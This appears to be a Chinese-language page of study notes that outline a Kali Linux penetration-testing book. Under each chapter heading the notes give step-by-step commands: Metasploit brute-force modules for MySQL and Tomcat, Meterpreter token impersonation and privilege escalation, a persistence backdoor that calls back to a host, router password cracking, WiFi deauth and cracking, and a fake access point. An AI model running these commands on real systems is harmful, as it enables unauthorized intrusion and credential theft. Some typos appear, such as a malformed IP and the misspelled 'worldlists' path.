                        <strong>注意：参照 kali linux 渗透测试技术详解</strong>

                <figure class="highlight">
                    <pre>
                        <code class="language-html" data-lang="html">
第一章、Linux安全渗透简介
第二章、配置kali linux
第三章、高级测试实验室
第四章、信息收集
    4.1. 局域网内扫描
        nmap -A 192.168.1.1-254
第五章、漏洞扫描
第六章、漏洞利用
    6.1. 渗透攻击mysql
        6.1.1. 启动msfconsole
            msfconsole
        6.1.2. 扫描mysql模块
            search mysql
        6.1.3. 使用mysql扫描模块
            use auxiliary/scanner/mysql/mysql_login
        6.1.4. 显示mysql扫描模块的有效选项
            show options
        6.1.5. 指定攻击目标系统
            set RHOSTS 192/168.1.124
            set user_file /root/Desktop/usernames.txt
            set pass_file /root/Desktop/passwords.txt
        6.1.6. 启动渗透攻击
            exploit
    6.2. 渗透攻击tomcat
        6.2.1. 启动msfconsole
            msfconsole
        6.2.2. 扫描tomcat模块
            search tomcat
        6.2.3. 使用tomcat管理登录模块进行渗透攻击
            use auxiliary/scanner/http/tomcat_mgr_login
        6.2.4. 查看tomcat模块有效选项
            show options
        6.2.5. 选择pass_file选项
            set PASS_FILE /usr/share/metasploit-framework/data/worldlists/tomcat_mgr_default_pass.txt
        6.2.6. 设置user_file选项
            set USER_FILE /usr/share/metasploit-framework/data/worldlists/tomcat_mgr_default_users.txt
        6.2.7. 设置攻击目标IP
            set RHOSTS 192.168.1.124
        6.2.8. 设置攻击目标PORT
            set RPORT 8080
        6.2.9. 开始渗透攻击
            exploit
    6.3. 解析wireshark中数据
        6.3.1. 启动wireshark
            wireshark &
        6.3.2. 查看FTP会话
            filter过滤条件为：ftp
            右键任意一行follow tcp stream
        6.3.3. 安装Xplico工具
            apt-get install -y xplico
        6.3.4. 启动apache
            service apache2 start
        6.3.5. 启动xplico
            service xplico start
        6.3.6. 登录xplico (xplico/xplico)
            http://localhost:9876
        6.3.7. 创建会话
            点击new case
            选择uploading pcap capture file/s
            点击sessions 创建session name
            进入新创建的session会话中
            upload捕获的pcap文件
            点击site
第七章、权限提升
    7.1. 假冒令牌
        7.1.1. 启动meterpreter会话
            sessions -i 1
        7.1.2. 加载incognito模块
            use incognito
        7.1.3. 列举所有令牌
            list_tokens -u
            AA-886OKJM26FSW\Test
        7.1.4. 使用impersonate_token命令假冒test用户进行攻击
            impersonate_token AA-886OKJM26FSW\\Test
    7.2. 本地权限提升
        7.2.1. 启动meterpreter会话
            sessions -i 1
        7.2.2. 提升本地权限
            getsystem
        7.2.3. 创建新用户
            add_user bob 123456 -h 192.168.2.124
    7.3. 创建持久后门
        7.3.1. 启动meterpreter会话
            sessions -i 1
        7.3.2. 创建持久后门
            run persistence -U -A -i 10 - 8090 -r 192.168.2.124
        7.3.3. 输出
            此时会保存一个vbs的脚本在目标主机上，且将会简历第二个meterpreter会话
    7.4. 中间人攻击
        7.4.1. arp欺骗
        7.4.2. ettercap工具
第八章、密码攻击
    8.1. 密码在线破解
        8.1.1. 破解工具
            hydra
        8.1.2. hydra破解字典
            /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/names/nameslist.txt
            /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt
        8.1.3. 破解工具
            medusa
        8.1.4. 破解路由器
            medusa -h 192.168.2.124 -u admin -P /usr/share/wfuzz/wordlists-user-passwd/passwds/john.txt -M http -e ns 80 -F
        8.1.5. 创建密码字典
            crunch、rtgen (彩虹表)
第九章、无线网络渗透测试
    9.1. Aircrack-ng 破解无线
        9.1.1. 查看无线网络接口
            airmon-ng
        9.1.2. 停止无线网络接口
            airmon-ng stop wlan0
        9.1.3. 修改无线网卡mac地址
            macchanger --mac xxx wlan0
        9.1.4. 启用无线网络接口
            airmon-ng start wlan0
        9.1.5. 捕获数据包
            airodump-ng -c 1 -w abc --bssid (mac地址) wlan0mon
        9.1.6. 对无线路由器Test进行deauth攻击
            aireplay-ng --deauth 1 -a (路由mac地址) -c (自定义mac地址) wlan0mon
        9.1.7. 破解密码
            aircrack-ng -w ./dic/wordlist wirelesssattack-01.cap
    9.2. easy-creds工具攻击无线网络
        9.2.1. 下载easy-credss安装包
            https://github.com/brav0hax/easy-creds
            easy-creds-master.zip
        9.2.2. 进入easy-creds目录
            unzip easy-creds-master.zip
            cd easy-creds
            选择 1 debian
            出现happy hunting即为成功
        9.2.3. 启动easy-creds工具
            ./easy-creds.sh
        9.2.4. 选择AP攻击
            选择编号3
        9.2.5. 选择静态伪AP攻击
            选择编号1
        9.2.6. 选择数据恢复
            选择编号4
        9.2.7. 分析ettercap.eci
            选择编号3
            拷贝上面eci全路径
            over
                        </code>
